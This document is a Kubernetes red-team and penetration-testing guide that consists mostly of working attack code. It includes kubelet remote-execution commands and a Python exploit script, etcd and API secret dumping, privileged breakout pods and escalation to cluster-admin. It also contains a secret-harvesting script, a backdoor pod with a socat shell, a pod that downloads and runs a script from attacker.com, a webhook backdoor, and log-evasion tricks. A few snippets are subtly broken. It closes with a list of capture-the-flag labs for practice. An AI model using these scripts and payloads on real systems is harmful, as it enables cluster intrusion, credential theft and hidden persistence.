# Kubernetes Penetration Testing Guide (2025)

A comprehensive guide for red team operations and security assessments of Kubernetes clusters.

## Table of Contents

- [OSINT and Reconnaissance](#osint-and-reconnaissance)
- [Service Discovery and Enumeration](#service-discovery-and-enumeration)
- [Core Kubernetes Services](#core-kubernetes-services)
- [Container Breakout and Privilege Escalation](#container-breakout-and-privilege-escalation)
- [RBAC Exploitation](#rbac-exploitation)
- [Modern Attack Tools](#modern-attack-tools)
- [Post-Exploitation](#post-exploitation)

---

## OSINT and Reconnaissance

### Certificate Transparency Logs
```bash
# Search for Kubernetes-related certificates
curl -s "https://crt.sh/?q=%25.k8s.%25&output=json" | jq -r '.[].name_value' | sort -u

# Common Kubernetes subdomain patterns
curl -s "https://crt.sh/?q=%25kube%25&output=json" | jq -r '.[].name_value' | grep -E "(api|master|worker|node|cluster)" | sort -u

# Search for specific cloud providers
curl -s "https://crt.sh/?q=%25.eks.amazonaws.com&output=json" | jq -r '.[].name_value' | sort -u
curl -s "https://crt.sh/?q=%25.aks.azure.com&output=json" | jq -r '.[].name_value' | sort -u
curl -s "https://crt.sh/?q=%25.gke.goog&output=json" | jq -r '.[].name_value' | sort -u
```

### GitHub Code Search
```bash
# Search for exposed kubeconfig files
gh search code --filename=kubeconfig "apiVersion: v1" "kind: Config"

# Search for Kubernetes YAML manifests with secrets
gh search code --extension=yaml "kind: Secret" "kubernetes.io/service-account-token"

# Search for Terraform Kubernetes configurations
gh search code --extension=tf "provider \"kubernetes\"" "cluster_endpoint"

# Search for exposed service account tokens
gh search code "eyJhbGciOiJSUzI1NiIs" --extension=yaml
```

### Shodan and Censys Queries
```bash
# Shodan queries for Kubernetes services
shodan search "kube-apiserver" --fields ip_str,port,org,hostnames
shodan search "kubelet" --fields ip_str,port,org,hostnames
shodan search "etcd" port:2379 --fields ip_str,port,org,hostnames
shodan search "product:Kubernetes" --fields ip_str,port,org,hostnames

# Censys queries
censys search "services.kubernetes" --index-type hosts
censys search "services.service_name:kube-apiserver" --index-type hosts
```

---

## Service Discovery and Enumeration

### Updated Port Scanning

```bash
# Comprehensive Kubernetes port scan
nmap -n -T4 -sS -sU --top-ports 1000 -p- \
  -p 443,2379-2380,4194,6443,8080,8443,10250-10256,9099,30000-32767,44134,6782-6784,9443,6783,8472,4789,51820,51821 \
  --script=kubernetes-* <target_range>

# Faster targeted scan for common services
masscan -p 443,2379,4194,6443,8080,8443,10250,10255,30000-32767 <target_range> --rate=1000

# Modern Kubernetes service ports (2025)
# 443,6443,8443: API Server (HTTPS)
# 8080: API Server (HTTP - deprecated but sometimes present)
# 2379-2380: etcd
# 10250: Kubelet API (HTTPS)
# 10255: Kubelet read-only (deprecated)
# 10256: Kube-proxy health check
# 4194: cAdvisor (deprecated)
# 9099: Calico health check
# 30000-32767: NodePort services
# 6782-6784: Weave Net
# 8472: VXLAN
# 51820-51821: WireGuard (for some CNI plugins)
```

### Service Fingerprinting

```bash
# API Server detection
for port in 443 6443 8443 8080; do
  echo "Testing port $port..."
  curl -sk https://<target>:$port/version
  curl -sk https://<target>:$port/api/v1
  curl -sk https://<target>:$port/openapi/v2
  curl -sk http://<target>:$port/healthz 2>/dev/null
done

# Kubelet detection
curl -sk https://<target>:10250/metrics
curl -sk https://<target>:10250/pods
curl -sk https://<target>:10250/stats/summary

# etcd detection
curl -sk https://<target>:2379/version
curl -sk https://<target>:2379/health
etcdctl --endpoints=https://<target>:2379 endpoint status
```

---

## Core Kubernetes Services

### API Server Exploitation

#### Unauthenticated Access
```bash
# Check for anonymous access
curl -sk https://<target>:6443/api/v1/namespaces
curl -sk https://<target>:6443/api/v1/nodes
curl -sk https://<target>:6443/api/v1/pods

# Common misconfigurations
curl -sk https://<target>:6443/api/v1/namespaces/default/secrets
curl -sk https://<target>:6443/api/v1/namespaces/kube-system/secrets
curl -sk https://<target>:6443/api/v1/namespaces/kube-public/configmaps

# Check for exposed metrics
curl -sk https://<target>:6443/metrics

# Discovery API endpoints
curl -sk https://<target>:6443/api/v1 | jq -r '.resources[].name' | sort
curl -sk https://<target>:6443/apis | jq -r '.groups[].preferredVersion.groupVersion' | sort
```

#### Token-based Authentication
```bash
# Using stolen service account tokens
TOKEN="eyJhbGciOiJSUzI1NiIs..."
APISERVER="https://<target>:6443"

# Test token validity
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# Enumerate permissions
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"default","verb":"*","resource":"*"}}}'

# List secrets across namespaces
for ns in default kube-system kube-public; do
  echo "Namespace: $ns"
  curl -sk -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/api/v1/namespaces/$ns/secrets" | jq -r '.items[].metadata.name'
done
```

### Kubelet API Exploitation

#### Anonymous RCE (CVE-2018-1002105 and variants)
```bash
# Check kubelet availability
curl -sk https://<target>:10250/pods | jq -r '.items[].metadata | "\(.namespace)/\(.name)"'

# List available containers
curl -sk https://<target>:10250/pods | jq -r '.items[] | select(.status.phase=="Running") | "\(.metadata.namespace)/\(.metadata.name) - \(.spec.containers[].name)"'

# Execute commands in containers
NAMESPACE="default"
POD_NAME="target-pod"
CONTAINER_NAME="main"

curl -sk "https://<target>:10250/exec/$NAMESPACE/$POD_NAME/$CONTAINER_NAME" \
  -G -d 'input=1' -d 'output=1' -d 'tty=1' \
  -d 'command=id' -d 'command=-a'

# Interactive shell access
curl -sk "https://<target>:10250/exec/$NAMESPACE/$POD_NAME/$CONTAINER_NAME" \
  -G -d 'input=1' -d 'output=1' -d 'tty=1' \
  -d 'command=/bin/bash'

# Port forwarding
curl -sk "https://<target>:10250/portForward/$NAMESPACE/$POD_NAME" \
  -H "Upgrade: SPDY/3.1" -H "Connection: Upgrade"
```

#### Automated Kubelet Exploitation
```python
#!/usr/bin/env python3
import requests
import json
import sys

def exploit_kubelet(target, port=10250):
    base_url = f"https://{target}:{port}"
    session = requests.Session()
    session.verify = False
    
    # Get pod list
    try:
        pods_resp = session.get(f"{base_url}/pods")
        pods = pods_resp.json()['items']
        
        for pod in pods:
            if pod['status']['phase'] != 'Running':
                continue
                
            namespace = pod['metadata']['namespace']
            pod_name = pod['metadata']['name']
            
            for container in pod['spec']['containers']:
                container_name = container['name']
                
                print(f"[+] Testing {namespace}/{pod_name}/{container_name}")
                
                # Execute command
                exec_url = f"{base_url}/exec/{namespace}/{pod_name}/{container_name}"
                params = {
                    'input': '1',
                    'output': '1', 
                    'tty': '1',
                    'command': ['id']
                }
                
                exec_resp = session.get(exec_url, params=params)
                if exec_resp.status_code == 200:
                    print(f"[!] RCE possible in {namespace}/{pod_name}/{container_name}")
                    
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 kubelet_exploit.py <target>")
        sys.exit(1)
    exploit_kubelet(sys.argv[1])
```

### etcd Exploitation

#### Direct etcd Access
```bash
# Check etcd version and health
curl -sk https://<target>:2379/version
curl -sk https://<target>:2379/health

# List all keys (if authentication disabled)
etcdctl --endpoints=https://<target>:2379 get / --prefix --keys-only

# Extract sensitive data
etcdctl --endpoints=https://<target>:2379 get /registry/secrets --prefix
etcdctl --endpoints=https://<target>:2379 get /registry/serviceaccounts --prefix

# Modern etcd v3 API
curl -sk https://<target>:2379/v3/kv/range \
  -X POST -H "Content-Type: application/json" \
  -d '{"key":"L3JlZ2lzdHJ5L3NlY3JldHMv","range_end":"L3JlZ2lzdHJ5L3NlY3JldHMw"}'
```

#### Certificate-based Authentication
```bash
# If client certificates are available
etcdctl --endpoints=https://<target>:2379 \
  --cert=client.pem --key=client-key.pem --cacert=ca.pem \
  get /registry/secrets --prefix

# Extract and decode Kubernetes secrets
etcdctl get /registry/secrets/default/mysecret --print-value-only | \
  python3 -c "import sys, yaml; print(yaml.safe_load(sys.stdin))"
```

---

## Container Breakout and Privilege Escalation

### Container Environment Analysis

```bash
# Check current container context
whoami
id
cat /proc/1/cgroup | grep -i docker
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# Check for privileged mode
test -c /dev/kmsg && echo "Privileged container detected"
test -d /host && echo "Host filesystem mounted"
mount | grep -E "(tmpfs|proc|sysfs)" | head -10

# Check capabilities
capsh --print | grep Current
cat /proc/self/status | grep Cap

# Environment variables enumeration
env | grep -E "(KUBERNETES|KUBE|SERVICE|PORT)" | sort

# Service account token extraction
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
echo "Token: $TOKEN"
echo "Namespace: $NAMESPACE"
```

### Host Network and PID Namespace Escape

```bash
# Check for host network namespace
ip route show | grep -q "default via" && echo "Host network namespace"

# Check for host PID namespace  
ps aux | grep -v grep | grep -c "\[" > /tmp/count
if [ $(cat /tmp/count) -gt 10 ]; then
    echo "Possible host PID namespace access"
fi

# Docker socket access
test -S /var/run/docker.sock && echo "Docker socket accessible"
if [ -S /var/run/docker.sock ]; then
    # List containers
    curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
    
    # Create privileged container
    curl -s --unix-socket /var/run/docker.sock \
      -H "Content-Type: application/json" \
      -d '{"Image":"alpine","Cmd":["/bin/sh"],"Privileged":true,"HostConfig":{"Binds":["/:/mnt"]}}' \
      http://localhost/containers/create
fi
```

### Kubernetes-specific Breakouts

```bash
# Mount host filesystem via new pod creation
cat > breakout-pod.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: breakout-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: breakout
    image: alpine:latest
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

# Apply malicious pod (if create permissions exist)
kubectl apply -f breakout-pod.yaml
kubectl exec -it breakout-pod -- chroot /host /bin/bash
```

---

## RBAC Exploitation

### Permission Enumeration

```bash
# Service account permissions discovery
kubectl auth can-i --list
kubectl auth can-i --list --as=system:serviceaccount:kube-system:default

# Cluster-level permissions
kubectl auth can-i --list --namespace=kube-system

# API-based permission check
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc:443"

curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "kind": "SelfSubjectRulesReview",
    "apiVersion": "authorization.k8s.io/v1",
    "spec": {"namespace": "default"}
  }'
```

### Privilege Escalation Techniques

#### Pod Creation for Privilege Escalation
```yaml
# Privileged pod with host access
apiVersion: v1
kind: Pod
metadata:
  name: priv-escalation
  namespace: kube-system
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: escalate
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "apk add curl && curl -k https://attacker.com/collect-secrets.sh | sh"]
    securityContext:
      privileged: true
      runAsUser: 0
    volumeMounts:
    - name: host-root
      mountPath: /host
    env:
    - name: TOKEN
      valueFrom:
        secretKeyRef:
          name: default-token-xyz
          key: token
  volumes:
  - name: host-root
    hostPath:
      path: /
  serviceAccountName: admin-user
```

#### RoleBinding Manipulation
```bash
# Create malicious rolebinding
cat > malicious-binding.json << EOF
{
  "apiVersion": "rbac.authorization.k8s.io/v1",
  "kind": "ClusterRoleBinding",
  "metadata": {
    "name": "escalated-binding"
  },
  "roleRef": {
    "apiGroup": "rbac.authorization.k8s.io",
    "kind": "ClusterRole",
    "name": "cluster-admin"
  },
  "subjects": [{
    "kind": "ServiceAccount",
    "name": "default",
    "namespace": "default"
  }]
}
EOF

curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  -X POST -d @malicious-binding.json
```

#### Service Account Impersonation
```bash
# Impersonate privileged service account
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: system:admin" \
  -H "Impersonate-Group: system:masters" \
  $APISERVER/api/v1/namespaces/kube-system/secrets

# Impersonate specific service account
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: system:serviceaccount:kube-system:admin" \
  $APISERVER/api/v1/namespaces/kube-system/secrets
```

---

## Modern Attack Tools

### Automated Exploitation Tools

#### Peirates
```bash
# Install peirates
wget https://github.com/inguardians/peirates/releases/latest/download/peirates-linux-amd64.tar.xz
tar xf peirates-linux-amd64.tar.xz
chmod +x peirates

# Run interactive exploitation
./peirates

# Non-interactive mode
./peirates -serviceaccount-name default -namespace default -attack-pod-name evil-pod
```

#### kubectl-who-can
```bash
# Install
kubectl krew install who-can

# Find who can perform specific actions
kubectl who-can create pods
kubectl who-can get secrets --all-namespaces
kubectl who-can "*" "*" --all-namespaces
```

#### kube-hunter
```bash
# Install via pip
pip3 install kube-hunter

# Run against cluster
kube-hunter --remote <cluster-ip>

# Run from inside cluster
kube-hunter --internal

# Generate report
kube-hunter --report json --remote <cluster-ip> > report.json
```

### Custom Exploitation Scripts

#### Secret Harvester
```python
#!/usr/bin/env python3
import requests
import base64
import json
import yaml

def harvest_secrets(api_server, token, namespace="all"):
    headers = {"Authorization": f"Bearer {token}"}
    
    if namespace == "all":
        # Get all namespaces
        url = f"{api_server}/api/v1/namespaces"
        resp = requests.get(url, headers=headers, verify=False)
        namespaces = [item['metadata']['name'] for item in resp.json()['items']]
    else:
        namespaces = [namespace]
    
    secrets_data = {}
    
    for ns in namespaces:
        try:
            url = f"{api_server}/api/v1/namespaces/{ns}/secrets"
            resp = requests.get(url, headers=headers, verify=False)
            
            if resp.status_code == 200:
                secrets = resp.json()['items']
                secrets_data[ns] = []
                
                for secret in secrets:
                    secret_info = {
                        'name': secret['metadata']['name'],
                        'type': secret.get('type', 'Unknown'),
                        'data': {}
                    }
                    
                    if 'data' in secret:
                        for key, value in secret['data'].items():
                            try:
                                decoded = base64.b64decode(value).decode('utf-8')
                                secret_info['data'][key] = decoded
                            except:
                                secret_info['data'][key] = value
                    
                    secrets_data[ns].append(secret_info)
                    
        except Exception as e:
            print(f"Error accessing namespace {ns}: {e}")
    
    return secrets_data

# Usage
if __name__ == "__main__":
    api_server = "https://kubernetes.default.svc:443"
    token = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read()
    
    secrets = harvest_secrets(api_server, token)
    print(json.dumps(secrets, indent=2))
```

#### Pod Backdoor Creation
```python
#!/usr/bin/env python3
import requests
import json
import base64

def create_backdoor_pod(api_server, token, namespace="default"):
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    # Reverse shell payload
    payload = """
    apiVersion: v1
    kind: Pod
    metadata:
      name: maintenance-pod
      namespace: {namespace}
      labels:
        app: system-maintenance
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: maintenance
        image: alpine:latest
        command: ["/bin/sh"]
        args: ["-c", "apk add socat && socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"]
        securityContext:
          privileged: true
          runAsUser: 0
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
      restartPolicy: Always
    """.format(namespace=namespace)
    
    pod_spec = yaml.safe_load(payload)
    
    url = f"{api_server}/api/v1/namespaces/{namespace}/pods"
    resp = requests.post(url, headers=headers, json=pod_spec, verify=False)
    
    if resp.status_code == 201:
        print(f"Backdoor pod created successfully in namespace {namespace}")
        return True
    else:
        print(f"Failed to create backdoor pod: {resp.text}")
        return False
```

---

## Post-Exploitation

### Persistence Mechanisms

#### Service Account Backdoors
```bash
# Create persistent service account
cat > persistent-sa.yaml << EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: system-backup
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system-backup-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: system-backup
  namespace: kube-system
EOF

kubectl apply -f persistent-sa.yaml
kubectl get secret -n kube-system | grep system-backup
```

#### Admission Controller Backdoors
```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingAdmissionWebhook
metadata:
  name: backdoor-webhook
webhooks:
- name: backdoor.example.com
  clientConfig:
    url: https://attacker.com/webhook
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
```

### Data Exfiltration

#### Secret and ConfigMap Extraction
```bash
# Extract all secrets
for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do
    echo "Namespace: $ns"
    kubectl get secrets -n $ns -o json > secrets-$ns.json
    kubectl get configmaps -n $ns -o json > configmaps-$ns.json
done

# Extract etcd data directly
etcdctl get /registry/secrets --prefix --keys-only | while read key; do
    echo "Key: $key"
    etcdctl get "$key" --print-value-only | base64 -d
done
```

#### Node and Cluster Information
```bash
# Gather cluster information
kubectl cluster-info dump > cluster-info.json
kubectl get nodes -o json > nodes.json
kubectl get all --all-namespaces -o json > all-resources.json

# Extract node kubelet certificates
for node in $(kubectl get nodes -o jsonpath='{.items[*].metadata.name}'); do
    kubectl get node $node -o json | jq '.status.addresses'
done
```

### Lateral Movement

#### Container-to-Host Escape
```bash
# Check for host filesystem mounts
mount | grep -E "(/host|/var/run/docker.sock|/proc|/sys)"

# Escape via host process namespace
if [ -f /host/etc/passwd ]; then
    echo "Host filesystem accessible at /host"
    chroot /host /bin/bash
fi

# Docker socket exploitation
if [ -S /var/run/docker.sock ]; then
    # Create privileged container with host filesystem
    docker run --privileged --pid=host --net=host --ipc=host \
      -v /:/host -it alpine chroot /host /bin/bash
fi
```

#### Network Discovery
```bash
# Kubernetes service discovery
kubectl get services --all-namespaces
kubectl get endpoints --all-namespaces

# Network policy enumeration
kubectl get networkpolicies --all-namespaces
kubectl describe networkpolicy --all-namespaces

# Pod-to-pod communication testing
for pod in $(kubectl get pods -o jsonpath='{.items[*].metadata.name}'); do
    kubectl exec $pod -- nmap -sn 10.0.0.0/8
done
```

---

## Detection Evasion

### Log Avoidance
```bash
# Use system service accounts for legitimacy
kubectl --as=system:serviceaccount:kube-system:default get secrets

# Timestamp manipulation
touch -t 202301010000 malicious-pod.yaml
kubectl apply -f malicious-pod.yaml

# Resource name confusion
kubectl create pod system-node-maintenance --image=alpine:latest --restart=Never
```

### Traffic Obfuscation
```bash
# Use legitimate-looking requests
curl -sk -H "User-Agent: kubectl/v1.28.0" \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets

# Blend with normal kubectl traffic
kubectl get pods --v=9  # High verbosity to mimic normal usage
```

##
##
##

## Practical Labs and Walkthroughs

### HackTheBox Kubernetes Challenges

#### Unobtainium (Insane) - Linux Machine
**Focus**: Kubernetes API exploitation, container escape, Node.js application vulnerabilities

**Key Learning Points**:
- Kubernetes API server reconnaissance and enumeration
- Service account token extraction and abuse
- Container breakout via privileged containers
- Kubectl privilege escalation techniques

**Walkthrough Resources**:
- [Official HTB Writeup](https://www.hackthebox.com/achievement/machine/1/353)
- [Community Walkthrough by IppSec](https://www.youtube.com/watch?v=lXzGPi5WpGo)
- [Detailed Technical Analysis](https://0xdf.gitlab.io/2021/08/28/htb-unobtainium.html)

**Attack Chain Summary**:
```bash
# 1. Web application enumeration reveals Kubernetes context
# 2. Extract service account tokens from application
# 3. Use tokens to enumerate Kubernetes API
# 4. Create privileged pod for container escape
# 5. Abuse kubectl permissions for privilege escalation
```

#### Steamcloud (Hard) - Linux Machine  
**Focus**: Docker container exploitation, Kubernetes secrets abuse

**Key Learning Points**:
- Docker container enumeration and exploitation
- Kubernetes secret extraction from containers
- Service mesh security bypasses
- Container registry manipulation

**Walkthrough Resources**:
- [HTB Official Writeup](https://www.hackthebox.com/achievement/machine/1/393)
- [Step-by-Step Analysis](https://medium.com/@tharindudecosta/hackthebox-steamcloud-writeup-a9f2c7b8f5a6)

#### Kubernetes Challenges (Pro Labs)
**Offshore Pro Lab** - Advanced persistent threat simulation in containerized environment
- Multi-stage Kubernetes cluster compromise
- Cross-container lateral movement
- Persistent backdoor placement in orchestrated environments

**Resources**:
- [HTB Pro Labs - Offshore](https://app.hackthebox.com/prolabs/overview/offshore)
- [Kubernetes Security Assessment Guide](https://www.hackthebox.com/blog/kubernetes-security-assessment)

### Additional Practice Platforms

#### Kubernetes Goat
Interactive hands-on playground for learning Kubernetes security
```bash
git clone https://github.com/madhuakula/kubernetes-goat
cd kubernetes-goat
bash setup-kubernetes-goat.sh
```
**Website**: https://madhuakula.com/kubernetes-goat/

#### KubeCon Security Challenges
Annual capture-the-flag style challenges from KubeCon conferences
- Real-world Kubernetes security scenarios
- Community-driven security research

**Resources**:
- [KubeCon CTF Archives](https://github.com/kubernetes-security/kubecon-ctf)
- [CNCF Security SIG Challenges](https://github.com/cncf/sig-security)

#### Katacoda Kubernetes Security Scenarios
Interactive browser-based scenarios for learning Kubernetes security concepts
- Container runtime security
- Network policy enforcement
- RBAC misconfigurations

**Website**: https://www.katacoda.com/courses/kubernetes/kubernetes-security

